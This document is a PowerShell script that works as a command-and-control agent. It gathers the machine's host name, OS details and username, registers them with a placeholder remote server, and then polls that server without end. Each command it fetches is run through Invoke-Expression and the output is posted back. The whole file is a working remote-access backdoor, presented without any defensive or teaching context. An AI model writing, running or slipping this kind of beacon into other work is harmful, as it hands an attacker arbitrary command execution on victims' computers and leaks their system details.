$base_url = "http://<ip>:<port>"

$system_info = Get-WmiObject -Class Win32_OperatingSystem | Select-Object CSName, OSArchitecture, Caption, Version, BuildNumber
$username = [Environment]::UserName

$data = @{
    "hostname" = $system_info.CSName
    "architecture" = $system_info.OSArchitecture
    "os_name" = $system_info.Caption
    "os_version" = $system_info.Version
    "username" = $username
} | ConvertTo-Json

$connect_url = "$base_url/connect"
$command_url = "$base_url/command/$($system_info.CSName)"

$retry_interval = 5
$max_retries = 10
$retry_count = 0

function Connect-ToServer {
    Write-Output "Connecting to server..."
    try {
        $connect_response = Invoke-WebRequest -Method Post -Uri $connect_url -Body $data -ContentType "application/json"
        if ($connect_response.StatusCode -eq 200) {
            Write-Output "Connected to server"
        } else {
            if ($retry_count -lt $max_retries) {
                Write-Output "Failed to connect to server. Retrying in $retry_interval seconds..."
                $retry_count++
                Start-Sleep -Seconds $retry_interval
                Connect-ToServer
            } else {
                Write-Output "Failed to connect to server after $max_retries attempts. Exiting..."
                exit
            }
        }
    } catch {
        Write-Output "An error occurred while connecting to the server. Retrying in $retry_interval seconds..."
        $retry_count++
        Start-Sleep -Seconds $retry_interval
        Connect-ToServer
    }
}

Connect-ToServer

while ($true) {
    try {
        $response = Invoke-WebRequest -Method Get -Uri $command_url
        if ($response.StatusCode -eq 200) {
            $command = $response.Content
            Write-Output "Received command: $command"
            $output = (Invoke-Expression $command | Out-String).Trim()
            $output = if ($output) { $output } else { "done" }
            Write-Output "Sending output: $output"
            $command_output_url = $command_url + "/" + $command
            Invoke-WebRequest -Method Post -Uri $command_output_url  -Body $output
        } else {
            Write-Output "Failed to retrieve command from server. Retrying in 10 seconds..."
            Start-Sleep -Seconds 10
        }
    } catch {
        Connect-ToServer
    }
}
